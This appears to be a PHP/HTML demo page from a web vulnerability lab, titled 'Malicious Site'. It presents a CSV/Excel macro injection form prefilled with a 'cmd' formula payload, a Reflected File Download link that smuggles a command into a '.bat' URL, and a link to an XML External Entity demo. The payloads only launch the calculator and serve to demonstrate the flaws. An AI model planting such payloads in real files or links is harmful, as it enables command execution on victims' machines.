<!DOCTYPE html>
<?php

include("../conf/context-url.php");

?>
<html lang="ja">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>Malicious Site</title>
		<!-- BootstrapのCSS読み込み -->
		<link href="<?php echo $contextRoot; ?>css/bootstrap/bootstrap.min.css" rel="stylesheet">
		<!-- 独自CSS読み込み -->
		<link href="<?php echo $contextRoot; ?>css/bootstrap/custom-default.css" rel="stylesheet">
		<!-- jQuery読み込み -->
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
		<!-- BootstrapのJS読み込み -->
		<script src="<?php echo $contextRoot; ?>js/bootstrap/bootstrap.min.js"></script>
		<link href="./verify.css" rel="stylesheet">
	</head>

	<body id="verify">
		<div class="verify-container">

			<!-- CSV Excel Macro Injection -->
			<div class="container-fluid">
				<div class="row" style="padding:20px 20px 0px;">
					<blockquote class="block-message" style="margin:0px;border-left-color:#337ab7;">
					  <p>CSV Excel Macro Injection</p>
					</blockquote>
				</div>
				<div class="row" style="padding:20px 0px;">
					<form action="./csv-excel-macro-injection/csv-excel-macro-injection.php" method="post">
						<div>
							<div class="form-group">
								<label for="macro-command">MACRO COMMAND</label>
								<input type="text" class="form-control" id="macro-command" name="macro-command" 
									value="=cmd|' /C calc'!A0">
							</div>
						</div>
						<button type="submit" class="btn btn-primary">Submit</button>
					</form>
				</div>
			</div>

			<!-- Reflected File Download -->
			<div class="container-fluid">
				<div class="row" style="padding:20px 20px 0px;">
					<blockquote class="block-message" style="margin:0px;border-left-color:#337ab7;">
					  <p>Reflected File Download</p>
					</blockquote>
				</div>
				<div class="row" style="padding:20px 0px;">
					<div>
						<div class="form-group">
							<label for="macro-command">Reflected File Download</label>
							<a download href='./reflected-file-download/reflected-file-download.php/ie_installer.bat?test=||calc||'>click me</a>
						</div>
					</div>
				</div>
			</div>

			<!-- XML eXternal Entity -->
			<div class="container-fluid">
				<div class="row" style="padding:20px 20px 0px;">
					<blockquote class="block-message" style="margin:0px;border-left-color:#337ab7;">
					  <p>XML eXternal Entity</p>
					</blockquote>
				</div>
				<div class="row" style="padding:20px 0px;">
					<div>
						<div class="form-group">
							<label for="macro-command">XML eXternal Entity</label>
							<a download href='./xml-external-entity/xml-external-entity.php'>click me</a>
						</div>
					</div>
				</div>
			</div>

		</div>

	</body>
</html>
